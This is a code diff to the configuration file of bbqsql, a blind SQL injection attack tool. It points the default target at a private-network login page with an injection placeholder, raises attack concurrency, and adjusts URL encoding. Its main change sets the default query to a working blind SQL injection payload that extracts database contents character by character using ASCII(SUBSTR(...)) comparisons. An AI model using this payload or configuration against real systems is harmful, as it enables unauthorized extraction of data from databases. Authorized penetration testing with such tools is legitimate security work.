@@ -174,7 +174,7 @@ class RequestsConfig:
             'validator':None},\
         'url':\
             {'name':'url',\
-            'value':'http://127.0.0.1:8090/boolean?${injection}',\
+            'value':'http://192.168.1.254/index.php?username=user1&password=secret${injection}',\
             'description':'The URL that requests should be sent to.',\
             'types':[str,Query],\
             'required':True,\
@@ -187,15 +187,15 @@ class RequestsConfig:
         for key in self.config:
             thing = self.config[key]
             if type(thing['value']) == str and re.match(u'.*\$\{.+\}.*',thing['value']):
-                thing['value'] = Query(thing['value'])
+                thing['value'] = Query(thing['value'],encoder=quote)
             
             elif type(thing['value']) == dict:
                 for key in thing['value']:
                     if re.match(u'\$\{.+\}',key):
-                        thing['value'][Query(key)] = thing['value'][key]
+                        thing['value'][Query(key,encoder=quote)] = thing['value'][key]
                         del(thing['value'][key])
                     if re.match(u'\$\{.+\}',thing['value'][key]):
-                        thing['value'][key] = Quote(thing['value'][key])
+                        thing['value'][key] = Quote(thing['value'][key],encoder=quote)
 
 
     def validate(self,quiet=False):
@@ -343,7 +343,7 @@ def validate_search_type(thing):
 
 def validate_query(thing):
     if type(thing['value']) != Query:
-        thing['value'] = Query(thing['value'],encoder=quote)
+        thing['value'] = Query(thing['value'])
     
     return True
 
@@ -352,7 +352,7 @@ class bbqsqlConfig(RequestsConfig):
     config = {\
         'concurrency':\
             {'name':'concurrency',\
-            'value':50,\
+            'value':75,\
             'description':'Controls the amount of concurrency to run the attack with. This is useful for throttling the requests',\
             'types':[str,int],\
             'required':True,\
@@ -373,7 +373,7 @@ class bbqsqlConfig(RequestsConfig):
             'validator':validate_search_type},\
         'query':\
             {'name':'query',\
-            'value':"row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",\
+            'value':"' and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} or 'b'='a",\
             'description':text.query_text,\
             'types':[str,Query],\
             'required':True,\
